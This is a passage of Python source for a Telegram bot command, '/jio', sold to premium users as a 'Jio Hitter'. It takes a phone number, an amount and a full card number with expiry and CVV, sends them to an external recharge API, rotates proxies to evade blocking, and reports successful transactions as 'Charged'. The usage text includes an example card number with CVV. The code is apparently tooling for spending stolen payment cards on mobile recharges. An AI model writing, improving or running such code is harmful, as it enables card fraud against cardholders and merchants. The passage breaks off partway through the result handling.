@bot.on(events.NewMessage(pattern=r'^/jio(?:\s+(.+))?$'))
async def jio_cmd(event):
    uid = event.sender_id
    if is_banned(uid):
        return

    if not is_premium(uid) and not is_admin(uid):
        await event.reply(pe(f"❌ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱"), parse_mode='html')
        return

    body = (event.pattern_match.group(1) or "").strip()
    if not body:
        await event.reply(pe(
            f"[⌯] 𝗝𝗶𝗼 𝗛𝗶𝘁𝘁𝗲𝗿 ⌁ 📱\n"
            f"{SEP}\n"
            f"[⌯] 𝗨𝘀𝗮𝗴𝗲 ⌁ /jio number amount card|mm|yy|cvv\n"
            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ⌁ /jio 9226217275 19 5131626819112270|09|2026|885\n"
            f"{SEP}\n"
            f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ /setproxy 𝘀𝗲 𝘂𝘀𝗲 𝗵𝗼𝘁𝗮 ⌁ 🔌"
        ), parse_mode='html')
        return

    parts = body.split()
    if len(parts) < 3:
        await event.reply(pe(f"❌ 𝗨𝘀𝗮𝗴𝗲 ⌁ /jio number amount card|mm|yy|cvv"), parse_mode='html')
        return

    number = parts[0].strip()
    amount = parts[1].strip()
    card_raw = " ".join(parts[2:]).strip()

    cards = extract_cc(card_raw)
    if not cards:
        if "|" in card_raw:
            cards = [card_raw.replace(" ", "")]
        else:
            await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱"), parse_mode='html')
            return
    card = cards[0]

    if not number.isdigit() or len(number) < 10:
        await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿"), parse_mode='html')
        return

    # ═══ Get proxy pool ═══
    proxies = get_proxies_for_user(uid) or load_proxies()
    if not proxies:
        await event.reply(pe(f"❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝘆 ⌁ /setproxy ip:port:user:pass"), parse_mode='html')
        return

    import random as _rnd

    def _pick_proxy():
        """Pick random proxy, convert to ip:port:user:pass format."""
        p = _rnd.choice(proxies).strip()
        # Strip scheme
        for prefix in ('http://', 'https://', 'socks4://', 'socks5://'):
            if p.startswith(prefix):
                p = p[len(prefix):]
                break
        # user:pass@ip:port → ip:port:user:pass
        if '@' in p:
            creds, hostport = p.rsplit('@', 1)
            if ':' in creds:
                user, pw = creds.split(':', 1)
                return f"{hostport}:{user}:{pw}"
            return hostport
        # Already ip:port or ip:port:user:pass
        return p

    smsg = await event.reply(pe(
        f"[⌯] 𝗝𝗶𝗼 𝗥𝗲𝗰𝗵𝗮𝗿𝗴𝗲 ⌁ 📱\n"
        f"{SEP}\n"
        f"[⌯] 𝗡𝘂𝗺𝗯𝗲𝗿 ⌁ <code>{number}</code> 📞\n"
        f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ <code>{amount}</code> 💰\n"
        f"[⌯] 𝗖𝗮𝗿𝗱 ⌁ <tg-spoiler><code>{card}</code></tg-spoiler> 💳\n"
        f"{SEP}\n"
        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴..."
    ), parse_mode='html')

    # ═══ Try up to 3 different proxies ═══
    url = JIO_API.rstrip("/")
    timeout = aiohttp.ClientTimeout(total=90)
    conn = aiohttp.TCPConnector(ssl=False)

    t0 = time.time()
    result_data = None
    used_proxy = None
    last_error = None

    for attempt in range(3):
        proxy_param = _pick_proxy()
        used_proxy = proxy_param
        params = {
            "number": number,
            "amount": amount,
            "card": card,
            "proxy": proxy_param,
        }

        try:
            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                async with s.get(url, params=params) as r:
                    http_status = r.status
                    try:
                        data = await r.json()
                    except Exception:
                        data = {"_raw": await r.text()}

                    # Check if API returned a real result (not proxy error)
                    if isinstance(data, dict):
                        _user_msg = (data.get("user_message") or "").lower()
                        _error = (data.get("error") or "").lower()

                        # Proxy error → retry with different proxy
                        if "proxy" in _error and ("dead" in _error or "failed" in _error):
                            print(f"[JIO] Attempt {attempt+1} proxy failed: {proxy_param[:40]}")
                            last_error = _error
                            continue

                        # Valid response → use it
                        result_data = data
                        break
        except asyncio.TimeoutError:
            print(f"[JIO] Attempt {attempt+1} timeout")
            last_error = "timeout"
            continue
        except Exception as e:
            print(f"[JIO] Attempt {attempt+1} error: {e}")
            last_error = str(e)
            continue

    elapsed = round(time.time() - t0, 2)

    # ═══ Parse response ═══
    if result_data is None:
        await smsg.edit(pe(
            f"❌ 𝗝𝗶𝗼 𝗘𝗿𝗿𝗼𝗿 ⌁ ⚠️\n"
            f"{SEP}\n"
            f"[⌯] 𝗔𝗹𝗹 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗮𝗶𝗹𝗲𝗱\n"
            f"[⌯] 𝗟𝗮𝘀𝘁 𝗲𝗿𝗿𝗼𝗿 ⌁ {str(last_error)[:100]}"
        ), parse_mode='html')
        return

    data = result_data
    _ok = data.get("ok")
    _stage = data.get("stage", "")
    _user_msg = data.get("user_message", "")
    _error = data.get("error", "")
    _payload = data.get("payload") or {}

    # ═══ Determine result type ═══
    if _ok is True or (_payload and _payload.get("status") is True):
        # ═══ SUCCESS ═══
        status = "SUCCESS"
        msg = _user_msg or "Recharge successful"
        head = "[⌯] 𝗝𝗶𝗼 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌁ ✅"
        status_display = "𝚁𝙴𝙲𝙷𝙰𝚁𝙶𝙀 𝚂𝚄𝙲𝙲𝙴𝚂𝚂"
        hit_type = "Charged"
    else:
        # ═══ FAILED — determine type ═══
        raw_msg = (_user_msg or _error or "Unknown error").strip()
        raw_msg_lower = raw_msg.lower()

        # Proxy error (hitter issue)
        if "proxy" in raw_msg_lower and ("dead" in raw_msg_lower or "failed to reach" in raw_msg_lower or "couldn't connect" in raw_msg_lower):
            status_display = "𝙿𝚁𝙾𝚇𝚈 𝙴𝚁𝚁𝙾𝚁"
            head = "[⌯] 𝗝𝗶𝗼 ⌁ 𝗣𝗿𝗼𝘅𝘆 𝗘𝗿𝗿𝗼𝗿 ⌁ ⚠️"
            msg = "Proxy dead — try again / change proxy"
            hit_type = None

        # Card declined by gateway (bank/gateway issue, NOT hitter)
